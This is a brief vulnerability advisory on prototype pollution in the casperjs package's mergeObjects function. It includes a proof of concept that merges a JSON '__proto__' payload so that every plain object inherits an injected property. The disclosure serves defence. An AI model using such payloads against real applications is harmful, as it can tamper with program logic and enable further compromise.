# Overview

`casperjs` is a navigation scripting & testing utility for PhantomJS and SlimerJS.

This package is vulnerable to Prototype Pollution. The `mergeObjects` utility function is vulnerable to Prototype Pollution.

# Proof of Concept

```
var payload = JSON.parse('{"__proto__": {"a": "pwned"}}')
mergeObjects({}, payload)
console.log({}.a) // prints "pwned"
```
